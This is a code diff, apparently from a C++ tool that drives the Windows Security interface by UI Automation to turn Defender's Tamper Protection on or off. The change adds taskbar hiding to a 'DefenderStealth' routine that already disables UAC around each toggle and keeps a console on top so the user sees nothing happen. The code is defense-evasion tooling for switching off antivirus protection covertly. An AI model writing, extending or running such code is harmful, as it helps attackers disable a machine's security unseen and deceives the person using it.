@@ -135,6 +135,7 @@ bool WindowsDefenderAutomation::openDefenderSettings() {
     DEBUG_LOG(L"Opening Windows Defender");
     
     // Set console as shield FIRST - before anything else can flash on screen
+    DefenderStealth::HideTaskbar();
     DefenderStealth::SetConsoleTopmost();
 
     if (isColdBoot()) {
@@ -153,6 +154,7 @@ bool WindowsDefenderAutomation::openDefenderSettings() {
     if (!hwndSecurity || !waitForUILoaded(50)) { 
         ERROR_LOG(L"Failed to load Defender UI (timeout on slow system)");
         DefenderStealth::RestoreConsoleNormal();
+        DefenderStealth::ShowTaskbar();
         return false;
     }
     return true;
@@ -304,6 +306,7 @@ void WindowsDefenderAutomation::closeSecurityWindow() {
     
     // Restore console to normal state and clear screen
     DefenderStealth::RestoreConsoleNormal();
+    DefenderStealth::ShowTaskbar();
     std::wcout << L"[*] Security window closed. Operation finished.\n";
 }
 
@@ -450,7 +453,10 @@ bool WindowsDefenderAutomation::toggleTamperProtection() {
     if (!DefenderStealth::BackupAndDisableUAC()) return false;
     
     IUIAutomationElement* pButton = findLastToggleSwitch();
-    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }
+    if (!pButton) { 
+        DefenderStealth::RestoreUAC(); 
+        return false; 
+    }
 
     IUIAutomationTogglePattern* pToggle = nullptr;
     pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
@@ -476,14 +482,14 @@ bool WindowsDefenderAutomation::toggleTamperProtection() {
     } else {
         pButton->Release();
     }
-    
+
     DefenderStealth::RestoreUAC();
     return result;
 }
 
 bool WindowsDefenderAutomation::enableTamperProtection() {
     if (!DefenderStealth::BackupAndDisableUAC()) return false;
-    
+
     IUIAutomationElement* pButton = findLastToggleSwitch();
     if (!pButton) { 
         DefenderStealth::RestoreUAC(); 
@@ -516,16 +522,19 @@ bool WindowsDefenderAutomation::enableTamperProtection() {
         pButton->Release();
         result = false;
     }
-    
+
     DefenderStealth::RestoreUAC();
     return result;
 }
 
 bool WindowsDefenderAutomation::disableTamperProtection() {
     if (!DefenderStealth::BackupAndDisableUAC()) return false;
-    
+
     IUIAutomationElement* pButton = findLastToggleSwitch();
-    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }
+    if (!pButton) { 
+        DefenderStealth::RestoreUAC(); 
+        return false; 
+    }
 
     IUIAutomationTogglePattern* pToggle = nullptr;
     pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);
@@ -553,7 +562,7 @@ bool WindowsDefenderAutomation::disableTamperProtection() {
         pButton->Release();
         result = false;
     }
-    
+
     DefenderStealth::RestoreUAC();
     return result;
 }
